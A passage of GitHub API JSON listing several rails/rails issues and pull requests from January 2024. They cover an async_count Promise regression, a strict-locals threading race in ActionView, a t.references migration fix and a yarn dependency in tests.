            "diff_url": "https://github.com/rails/rails/pull/50778.diff",
            "patch_url": "https://github.com/rails/rails/pull/50778.patch",
            "merged_at": "2024-01-17T19:44:39Z"
        },
        "body": "Fixes #50776.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50778/reactions",
            "total_count": 4,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 4,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50778/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50777",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50777/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50777/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50777/events",
        "html_url": "https://github.com/rails/rails/issues/50777",
        "id": 2085763688,
        "node_id": "I_kwDNIULOfFI6aA",
        "number": 50777,
        "title": "rails server",
        "user": {
            "login": "wwh131",
            "id": 134466725,
            "node_id": "U_kgDOCAPMpQ",
            "avatar_url": "https://avatars.githubusercontent.com/u/134466725?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/wwh131",
            "html_url": "https://github.com/wwh131",
            "followers_url": "https://api.github.com/users/wwh131/followers",
            "following_url": "https://api.github.com/users/wwh131/following{/other_user}",
            "gists_url": "https://api.github.com/users/wwh131/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/wwh131/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/wwh131/subscriptions",
            "organizations_url": "https://api.github.com/users/wwh131/orgs",
            "repos_url": "https://api.github.com/users/wwh131/repos",
            "events_url": "https://api.github.com/users/wwh131/events{/privacy}",
            "received_events_url": "https://api.github.com/users/wwh131/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-17T09:25:26Z",
        "updated_at": "2024-01-17T09:30:27Z",
        "closed_at": "2024-01-17T09:30:27Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "rails new blog\r\ncd blog \r\nrails server\r\nUsage:\r\n  rails new APP_PATH [options]\r\n\r\nOptions:\r\n                 [--skip-namespace], [--no-skip-namespace]              # Skip namespace (affects only isolated engines)\r\n                                                                        # Default: false\r\n                 [--skip-collision-check], [--no-skip-collision-check]  # Skip collision check\r\n                                                                        # Default: false\r\n  -r,            [--ruby=PATH]                                          # Path to the Ruby binary of your choice\r\n                                                                        # Default: /usr/local/bin/ruby\r\n  -n,            [--name=NAME]                                          # Name of the app\r\n  -m,            [--template=TEMPLATE]                                  # Path to some application template (can be a filesystem path or URL)\r\n  -d,            [--database=DATABASE]                                  # Preconfigure for selected database (options: mysql/trilogy/postgresql/sqlite3/oracle/sqlserver/jdbcmysql/jdbcsqlite3/jdbcpostgresql/jdbc)\r\n                                                                        # Default: sqlite3\r\n  -G,            [--skip-git], [--no-skip-git]                          # Skip git init, .gitignore and .gitattributes\r\n                 [--skip-docker], [--no-skip-docker]                    # Skip Dockerfile, .dockerignore and bin/docker-entrypoint\r\n                 [--skip-keeps], [--no-skip-keeps]                      # Skip source control .keep files\r\n  -M,            [--skip-action-mailer], [--no-skip-action-mailer]      # Skip Action Mailer files\r\n                 [--skip-action-mailbox], [--no-skip-action-mailbox]    # Skip Action Mailbox gem\r\n                 [--skip-action-text], [--no-skip-action-text]          # Skip Action Text gem\r\n  -O,            [--skip-active-record], [--no-skip-active-record]      # Skip Active Record files\r\n                 [--skip-active-job], [--no-skip-active-job]            # Skip Active Job\r\n                 [--skip-active-storage], [--no-skip-active-storage]    # Skip Active Storage files\r\n  -C,            [--skip-action-cable], [--no-skip-action-cable]        # Skip Action Cable files\r\n  -A,            [--skip-asset-pipeline], [--no-skip-asset-pipeline]    # Indicates when to generate skip asset pipeline\r\n  -a,            [--asset-pipeline=ASSET_PIPELINE]                      # Choose your asset pipeline [options: sprockets (default), propshaft]\r\n                                                                        # Default: sprockets\r\n  -J, --skip-js, [--skip-javascript], [--no-skip-javascript]            # Skip JavaScript files\r\n                 [--skip-hotwire], [--no-skip-hotwire]                  # Skip Hotwire integration\r\n                 [--skip-jbuilder], [--no-skip-jbuilder]                # Skip jbuilder gem\r\n  -T,            [--skip-test], [--no-skip-test]                        # Skip test files\r\n                 [--skip-system-test], [--no-skip-system-test]          # Skip system test files\r\n                 [--skip-bootsnap], [--no-skip-bootsnap]                # Skip bootsnap gem\r\n                 [--skip-dev-gems], [--no-skip-dev-gems]                # Skip development gems (e.g., web-console)\r\n                 [--dev], [--no-dev]                                    # Set up the application with Gemfile pointing to your Rails checkout\r\n                 [--edge], [--no-edge]                                  # Set up the application with a Gemfile pointing to the 7-1-stable branch on the Rails repository\r\n  --master,      [--main], [--no-main]                                  # Set up the application with Gemfile pointing to Rails repository main branch\r\n                 [--rc=RC]                                              # Path to file containing extra configuration options for rails command\r\n                 [--no-rc]                                              # Skip loading of extra configuration options from .railsrc file\r\n                 [--api], [--no-api]                                    # Preconfigure smaller stack for API only apps\r\n                                                                        # Default: false\r\n                 [--minimal], [--no-minimal]                            # Preconfigure a minimal rails app\r\n  -j, --js,      [--javascript=JAVASCRIPT]                              # Choose JavaScript approach [options: importmap (default), bun, webpack, esbuild, rollup]\r\n                                                                        # Default: importmap\r\n  -c,            [--css=CSS]                                            # Choose CSS processor [options: tailwind, bootstrap, bulma, postcss, sass] check https://github.com/rails/cssbundling-rails for more options\r\n  -B,            [--skip-bundle], [--no-skip-bundle]                    # Don't run bundle install\r\n                 [--skip-decrypted-diffs], [--no-skip-decrypted-diffs]  # Don't configure git to show decrypted diffs of encrypted credentials\r\n\r\nRuntime options:\r\n  -f, [--force]                    # Overwrite files that already exist\r\n  -p, [--pretend], [--no-pretend]  # Run but do not make any changes\r\n  -q, [--quiet], [--no-quiet]      # Suppress status output\r\n  -s, [--skip], [--no-skip]        # Skip files that already exist\r\n\r\nRails options:\r\n  -h, [--help], [--no-help]        # Show this help message and quit\r\n  -v, [--version], [--no-version]  # Show Rails version number and quit\r\n\r\nDescription:\r\n    The `rails new` command creates a new Rails application with a default\r\n    directory structure and configuration at the path you specify.\r\n\r\n    You can specify extra command-line arguments to be used every time\r\n    `rails new` runs in the .railsrc configuration file in your home directory,\r\n    or in $XDG_CONFIG_HOME/rails/railsrc if XDG_CONFIG_HOME is set.\r\n\r\n    Note that the arguments specified in the .railsrc file don't affect the\r\n    default values shown above in this help message.\r\n\r\n    You can specify which version to use when creating a new rails application\r\n    using `rails _<version>_ new`.\r\n\r\nExamples:\r\n    `rails new ~/Code/Ruby/weblog`\r\n\r\n    This generates a new Rails app in ~/Code/Ruby/weblog.\r\n\r\n    `rails _<version>_ new weblog`\r\n\r\n    This generates a new Rails app with the provided version in ./weblog.\r\n\r\n    `rails new weblog --api`\r\n\r\n    This generates a new Rails app in API mode in ./weblog.\r\n\r\n    `rails new weblog --skip-action-mailer`\r\n\r\n    This generates a new Rails app without Action Mailer in ./weblog.\r\n    Any part of Rails can be skipped during app generation.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50777/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50777/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50776",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50776/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50776/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50776/events",
        "html_url": "https://github.com/rails/rails/issues/50776",
        "id": 2085259587,
        "node_id": "I_kwDNIULOfEqJQw",
        "number": 50776,
        "title": "Rails 7.1.3: async_count returns a completed Promise instead of the value",
        "user": {
            "login": "guillaumebriday",
            "id": 8252238,
            "node_id": "MDQ6VXNlcjgyNTIyMzg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8252238?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/guillaumebriday",
            "html_url": "https://github.com/guillaumebriday",
            "followers_url": "https://api.github.com/users/guillaumebriday/followers",
            "following_url": "https://api.github.com/users/guillaumebriday/following{/other_user}",
            "gists_url": "https://api.github.com/users/guillaumebriday/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/guillaumebriday/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/guillaumebriday/subscriptions",
            "organizations_url": "https://api.github.com/users/guillaumebriday/orgs",
            "repos_url": "https://api.github.com/users/guillaumebriday/repos",
            "events_url": "https://api.github.com/users/guillaumebriday/events{/privacy}",
            "received_events_url": "https://api.github.com/users/guillaumebriday/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-01-17T02:10:06Z",
        "updated_at": "2024-02-23T15:52:43Z",
        "closed_at": "2024-01-17T19:44:40Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nFollowing this issue https://github.com/rails/rails/issues/50399\r\n\r\nI updated my application to Rails `7.1.3` and now `async_count` returns `#<ActiveRecord::Promise status=complete>` instead of the value directly\r\n\r\nI created a reproduction repo (same as last time) and updated the case \r\n\r\nhttps://github.com/guillaumebriday/async_count_bug\r\n\r\n- here is the controller: https://github.com/guillaumebriday/async_count_bug/blob/main/app/controllers/posts_controller.rb#L5- \r\n- here is the view: https://github.com/guillaumebriday/async_count_bug/blob/main/app/views/posts/index.html.erb#L10-L11\r\n\r\nping @fatkodima \r\n\r\n### Actual behavior\r\nWe need to use `.value.value` to get the actual value instead of `.value` only as it was before\r\n\r\n![Screenshot 2024-01-16 at 21 05 29](https://github.com/rails/rails/assets/8252238/bc9f3ac9-1f0d-42c4-ba62-291a05534899)\r\n\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50776/reactions",
            "total_count": 6,
            "+1": 4,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 2
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50776/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50775",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50775/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50775/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50775/events",
        "html_url": "https://github.com/rails/rails/pull/50775",
        "id": 2085180599,
        "node_id": "PR_kwDNIULOZEKWsg",
        "number": 50775,
        "title": "Fix threading issue with strict locals",
        "user": {
            "login": "mockdeep",
            "id": 80543,
            "node_id": "MDQ6VXNlcjgwNTQz",
            "avatar_url": "https://avatars.githubusercontent.com/u/80543?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mockdeep",
            "html_url": "https://github.com/mockdeep",
            "followers_url": "https://api.github.com/users/mockdeep/followers",
            "following_url": "https://api.github.com/users/mockdeep/following{/other_user}",
            "gists_url": "https://api.github.com/users/mockdeep/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mockdeep/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mockdeep/subscriptions",
            "organizations_url": "https://api.github.com/users/mockdeep/orgs",
            "repos_url": "https://api.github.com/users/mockdeep/repos",
            "events_url": "https://api.github.com/users/mockdeep/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mockdeep/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-17T00:29:20Z",
        "updated_at": "2024-01-18T18:28:22Z",
        "closed_at": "2024-01-18T16:57:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50775",
            "html_url": "https://github.com/rails/rails/pull/50775",
            "diff_url": "https://github.com/rails/rails/pull/50775.diff",
            "patch_url": "https://github.com/rails/rails/pull/50775.patch",
            "merged_at": "2024-01-18T16:57:25Z"
        },
        "body": "Fixes #50774\n\nWhen the server boots up, 2 threads hit the same `UnboundTemplate`\ninstance before it has set up `@templates`. Both threads get past the\n`unless template = @templates[locals]` check because\n`@templates[locals]` isn't set yet. However, with `@write_lock`, one\nthread waits while the other one proceeds, setting `@templates` to a\nfrozen hash. The second thread then gets the write lock and tries to\nmodify `@templates` but it has been frozen.\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50775/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50775/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50774",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50774/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50774/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50774/events",
        "html_url": "https://github.com/rails/rails/issues/50774",
        "id": 2085173685,
        "node_id": "I_kwDNIULOfEk5tQ",
        "number": 50774,
        "title": "Threading issue with strict locals in ActionView",
        "user": {
            "login": "mockdeep",
            "id": 80543,
            "node_id": "MDQ6VXNlcjgwNTQz",
            "avatar_url": "https://avatars.githubusercontent.com/u/80543?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mockdeep",
            "html_url": "https://github.com/mockdeep",
            "followers_url": "https://api.github.com/users/mockdeep/followers",
            "following_url": "https://api.github.com/users/mockdeep/following{/other_user}",
            "gists_url": "https://api.github.com/users/mockdeep/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mockdeep/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mockdeep/subscriptions",
            "organizations_url": "https://api.github.com/users/mockdeep/orgs",
            "repos_url": "https://api.github.com/users/mockdeep/repos",
            "events_url": "https://api.github.com/users/mockdeep/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mockdeep/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-17T00:20:41Z",
        "updated_at": "2024-01-18T16:57:27Z",
        "closed_at": "2024-01-18T16:57:26Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "We've been seeing occasional errors when booting up our application coming from templates with strict locals enabled. It's not super common and only happens on application load:\r\n\r\n```\r\nFrozenError: can't modify frozen Hash: {}\r\n[GEM_ROOT]/gems/actionview-7.1.2/lib/action_view/unbound_template.rb:31 :in `block in bind_locals`\r\n[GEM_ROOT]/gems/actionview-7.1.2/lib/action_view/unbound_template.rb:22 :in `synchronize`\r\n[GEM_ROOT]/gems/actionview-7.1.2/lib/action_view/unbound_template.rb:22 :in `bind_locals`\r\n[GEM_ROOT]/gems/actionview-7.1.2/lib/action_view/template/resolver.rb:145 :in `block in _find_all`\r\n[GEM_ROOT]/gems/actionview-7.1.2/lib/action_view/template/resolver.rb:144 :in `map`\r\n[GEM_ROOT]/gems/actionview-7.1.2/lib/action_view/template/resolver.rb:144 :in `_find_all` \r\n```\r\n\r\nLooking at [the source code](https://github.com/rails/rails/blob/473fd597f6ff8a575c36c565d205627fa7964a05/actionview/lib/action_view/unbound_template.rb#L21-L38), I think I might know what is happening. When the server boots up, 2 threads hit the same `UnboundTemplate` instance before it has set up `@templates`. Both threads get past the `unless template = @templates[locals]` check because `@templates[locals]` isn't set yet. However, with `@write_lock`, one thread waits while the other one proceeds, setting `@templates` to a frozen hash. The second thread then gets the write lock and tries to modify `@templates` but it has been frozen.\r\n\r\nIt looks to me like it might make sense to move the `@templates[locals.dup] = template` bit into an `else` case below to prevent subsequent threads from trying to modify the hash.\r\n\r\n### Steps to reproduce\r\n\r\nIt's a bit tricky to reproduce, but I think you could do it if you put a binding just after the `unless template = @templates[locals]` and had two processes try to access a template for the first time. When both are there, you could exit the bindings and one process should cause an error.\r\n\r\n### Expected behavior\r\n\r\nIt should not raise an error when templates are loaded and strict locals are in use.\r\n\r\n### Actual behavior\r\n\r\nWe get errors on many of our deploys as the server boots up.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50774/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50774/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50773",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50773/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50773/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50773/events",
        "html_url": "https://github.com/rails/rails/pull/50773",
        "id": 2085065253,
        "node_id": "PR_kwDNIULOZEENbQ",
        "number": 50773,
        "title": "Fix t.references validating options on Rails < 7.1",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 377277835,
                "node_id": "MDU6TGFiZWwzNzcyNzc4MzU=",
                "url": "https://api.github.com/repos/rails/rails/labels/needs%20backport",
                "name": "needs backport",
                "color": "f9d0c4",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 0,
        "created_at": "2024-01-16T22:21:53Z",
        "updated_at": "2024-01-16T23:11:19Z",
        "closed_at": "2024-01-16T23:09:33Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50773",
            "html_url": "https://github.com/rails/rails/pull/50773",
            "diff_url": "https://github.com/rails/rails/pull/50773.diff",
            "patch_url": "https://github.com/rails/rails/pull/50773.patch",
            "merged_at": "2024-01-16T23:09:33Z"
        },
        "body": "### Motivation / Background\r\n\r\nOption validation was [added][1] for 7.1+ Migration classes, and a compatibility layer was added to ensure that previous Migration versions do not have their options validated. However, the `t.references` method was missing in the compatibility layer which results in pre 7.1 Migrations validating options passed to `t.references`.\r\n\r\n### Detail\r\n\r\nThis commit fixes the issue by adding t.references to the compatibility layer.\r\n\r\nSee also a [similar fix][2] for `add_reference`\r\n\r\n[1]: https://github.com/rails/rails/commit/e6da3ebd6c65af23d134a9e01145f26600912008\r\n[2]: https://github.com/rails/rails/commit/71b4e223018d180b7c96915c0df1c28afbf7cc53\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50773/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50773/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50772",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50772/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50772/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50772/events",
        "html_url": "https://github.com/rails/rails/issues/50772",
        "id": 2084942985,
        "node_id": "I_kwDNIULOfEW0iQ",
        "number": 50772,
        "title": "Tests can't run without yarn",
        "user": {
            "login": "arusa",
            "id": 623008,
            "node_id": "MDQ6VXNlcjYyMzAwOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/623008?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/arusa",
            "html_url": "https://github.com/arusa",
            "followers_url": "https://api.github.com/users/arusa/followers",
            "following_url": "https://api.github.com/users/arusa/following{/other_user}",
            "gists_url": "https://api.github.com/users/arusa/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/arusa/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/arusa/subscriptions",
            "organizations_url": "https://api.github.com/users/arusa/orgs",
            "repos_url": "https://api.github.com/users/arusa/repos",
            "events_url": "https://api.github.com/users/arusa/events{/privacy}",
            "received_events_url": "https://api.github.com/users/arusa/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-16T21:11:58Z",
        "updated_at": "2024-01-29T19:27:28Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n1. Create a new rails app that uses yarn\r\n2. `docker build -t testimage:1 .`\r\n3. `docker run -it testimage:1 /bin/bash`\r\n4. `bin/rails test`\r\n\r\n### Expected behavior\r\n\r\nAs the image already contains all precompiled assets I would expect the tests to be able to run successfully even without precompiling first.\r\n\r\n### Actual behavior\r\n\r\n`bin/rails test` now always runs `test:prepare`, which tries to compile the assets and therefore crashes, because the default Dockerfile doesn't keep yarn in the image.\r\n\r\nI want an option to skip running `test:prepare` when running tests.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: 3.1.4",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50772/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50772/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50771",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50771/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50771/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50771/events",
        "html_url": "https://github.com/rails/rails/pull/50771",
        "id": 2084663694,
        "node_id": "PR_kwDNIULOZDtaig",
        "number": 50771,
        "title": "Merge pull request #50758 from rails/fix-video-preview-nplus1",
        "user": {
            "login": "tenderlove",
            "id": 3124,
            "node_id": "MDQ6VXNlcjMxMjQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3124?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tenderlove",
            "html_url": "https://github.com/tenderlove",
            "followers_url": "https://api.github.com/users/tenderlove/followers",
            "following_url": "https://api.github.com/users/tenderlove/following{/other_user}",
            "gists_url": "https://api.github.com/users/tenderlove/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tenderlove/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tenderlove/subscriptions",
            "organizations_url": "https://api.github.com/users/tenderlove/orgs",
            "repos_url": "https://api.github.com/users/tenderlove/repos",
            "events_url": "https://api.github.com/users/tenderlove/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tenderlove/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": {
            "login": "tenderlove",
            "id": 3124,
            "node_id": "MDQ6VXNlcjMxMjQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3124?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tenderlove",
            "html_url": "https://github.com/tenderlove",
            "followers_url": "https://api.github.com/users/tenderlove/followers",
            "following_url": "https://api.github.com/users/tenderlove/following{/other_user}",
            "gists_url": "https://api.github.com/users/tenderlove/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tenderlove/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tenderlove/subscriptions",
            "organizations_url": "https://api.github.com/users/tenderlove/orgs",
            "repos_url": "https://api.github.com/users/tenderlove/repos",
            "events_url": "https://api.github.com/users/tenderlove/events{/privacy}",
